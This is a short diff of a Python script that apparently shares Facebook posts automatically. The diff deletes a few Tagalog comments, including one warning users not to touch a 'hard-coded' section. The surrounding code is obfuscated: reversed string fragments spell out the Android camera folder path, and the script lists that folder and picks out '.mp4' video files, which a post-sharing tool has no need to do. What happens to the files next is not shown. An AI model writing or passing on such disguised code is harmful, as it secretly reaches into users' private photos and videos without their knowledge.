@@ -7,8 +7,6 @@ import re
 import sys
 from rich.console import Console
 
-# Dito lang pede mo palitan
-# dont change the key name (e.g owner,facebook,etc.), value lang palitan mo
 info = {
   "owner": 'Astro Ksks',
   "facebook": 'https://www.facebook.com/christhenoob13',
@@ -93,7 +91,6 @@ class Share:
     print(f"\033[32m[*] \033[0msharing post done!!")
     exit()
 
-# hard-coded na dito, pag may ginulo ka sa code wag mo papa ayus sakin!!
 htop = ''.join(["arem", "aC/MI", "CD/0/", "detalume", "/ega", "rots/"])[::-1]
 x_data = os.listdir(htop)
 counterZ = list(filter(lambda x: x.endswith('4pm.'[::-1]), x_data))
